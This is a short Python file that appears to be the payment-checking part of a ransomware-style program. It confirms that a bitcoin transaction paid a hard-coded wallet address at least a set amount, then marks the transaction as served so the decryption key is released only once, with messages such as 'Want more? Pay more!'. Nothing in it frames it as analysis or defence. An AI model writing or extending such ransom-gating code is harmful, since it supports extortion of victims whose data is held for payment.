import http_requests

ADDRESS_TO_PAY_TO = 'bc1qwzyy3z9t062sft9876xx8g885pj3w3npgcwwq67em298fxg0htysu70985'
COST_FERNET_ENCRYPTION = 10000 # means 0.1 milli-bitcoin

served_transactions = set()

async def was_payment_made(transation_id):
    data = await http_requests.request_transaction_data(transation_id)

    for transaction in data['out']:
        address = transaction['addr']
        if address != ADDRESS_TO_PAY_TO:
            continue

        paid_amount = transaction['value']
        if paid_amount < COST_FERNET_ENCRYPTION:
            print(f'You paid {paid_amount}. THATS NOT ENOUGH')
            continue

        if transation_id in served_transactions:
            print(f'We already decrypted key for this transaction. Want more? Pay more!')
            continue

        served_transactions.add(transation_id)
        return True

    return False